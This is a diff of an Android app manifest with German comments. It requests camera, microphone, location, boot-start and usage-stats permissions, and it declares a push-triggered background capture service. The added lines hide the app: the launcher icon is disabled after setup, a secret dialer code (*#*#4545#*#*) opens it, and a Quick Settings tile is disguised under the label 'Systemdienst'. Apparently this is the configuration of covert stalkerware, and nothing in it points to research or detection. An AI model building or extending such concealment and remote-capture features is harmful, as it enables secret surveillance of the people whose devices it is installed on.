@@ -2,33 +2,20 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Netzwerk -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-    <!-- Kamera -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
-
-    <!-- Mikro -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-
-    <!-- Standort -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-
-    <!-- Foreground Service -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-
-    <!-- Auto-Start nach Neustart -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-
-    <!-- App-Nutzungsstatistiken -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
@@ -40,11 +27,13 @@
         android:dataExtractionRules="@xml/data_extraction_rules"
         tools:ignore="GoogleAppIndexingWarning">
 
+        <!-- Setup-Activity (kein Launcher-Icon) -->
         <activity
             android:name=".MainActivity"
-            android:exported="false"
+            android:exported="true"
             android:theme="@style/Theme.AppCompat.NoActionBar" />
 
+        <!-- Launcher-Alias: wird nach Setup deaktiviert -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
@@ -56,16 +45,27 @@
             </intent-filter>
         </activity-alias>
 
+        <!-- Geheimer Wählcode *#*#4545#*#* öffnet die App -->
+        <receiver
+            android:name=".receiver.SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="4545" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Boot-Receiver -->
         <receiver
             android:name=".receiver.BootReceiver"
-            android:exported="true"
-            android:enabled="true">
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
+        <!-- FCM -->
         <service
             android:name=".service.FcmTriggerService"
             android:exported="false">
@@ -74,11 +74,25 @@
             </intent-filter>
         </service>
 
+        <!-- Capture Foreground Service -->
         <service
             android:name=".service.CaptureForegroundService"
             android:exported="false"
             android:foregroundServiceType="camera|microphone|location" />
 
+        <!-- Quick Settings Tile -->
+        <service
+            android:name=".service.IkiTileService"
+            android:exported="true"
+            android:icon="@android:drawable/ic_menu_compass"
+            android:label="Systemdienst"
+            android:permission="android.permission.BIND_QUICK_SETTINGS_TILE">
+            <intent-filter>
+                <action android:name="android.service.quicksettings.action.QS_TILE" />
+            </intent-filter>
+        </service>
+
+        <!-- WorkManager -->
         <provider
             android:name="androidx.startup.InitializationProvider"
             android:authorities="${applicationId}.androidx-startup"
